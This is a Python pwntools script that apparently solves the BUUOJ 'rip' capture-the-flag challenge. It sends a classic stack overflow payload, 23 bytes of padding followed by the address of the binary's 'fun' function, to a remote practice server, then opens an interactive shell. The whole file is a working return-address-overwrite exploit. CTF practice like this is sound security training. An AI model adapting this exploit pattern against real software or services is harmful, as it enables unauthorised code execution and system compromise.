from pwn import *


def rip(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/rip'):
    target = process([file_name])
    target = remote('node5.buuoj.cn', 28394)
    target_elf = ELF(file_name)

    fun_ptr = p64(target_elf.symbols['fun'] + 1)

    payload = b'A' * 23
    payload += fun_ptr

    target.sendline(payload)

    target.interactive()


if __name__ == '__main__':
    rip()
